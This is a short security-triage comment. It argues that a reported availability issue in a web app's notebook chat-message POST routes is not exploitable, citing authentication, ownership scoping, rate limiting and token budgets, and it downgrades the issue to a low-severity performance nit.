NOT EXPLOITABLE / OVER-RATED SEVERITY: The two POST routes (apps/web/app/api/notebooks/[id]/chats/[chatId]/messages/route.ts and the /learn equivalent) are fully guarded: auth required (getAuthUserId, 401 otherwise), ownership-scoped (notebook by userId line 80, chat by notebookId line 83), IP rate-limited to 20 req/min (line 73), monthly token-budget gated (checkTokenBudget line 86 + checkUsageLimit('scholar_chat') in chat-stream.ts:219), and each message body capped at 10,000 chars (line 99). There is no unauthenticated path and no cross-tenant amplification. Growing a chat's history requires a legitimate user repeatedly messaging their OWN chat against their OWN quota. The practical ceiling is the model's context window, which the provider rejects long before any Node-process memory pressure (a few thousand short text rows is megabytes, not an OOM vector). This is a real but mild cost/latency inefficiency — the standard "reload full conversation each turn" pattern — worth a "sliding window / take last N messages" optimization, but it is a Low performance nit, not a High availability/security issue.

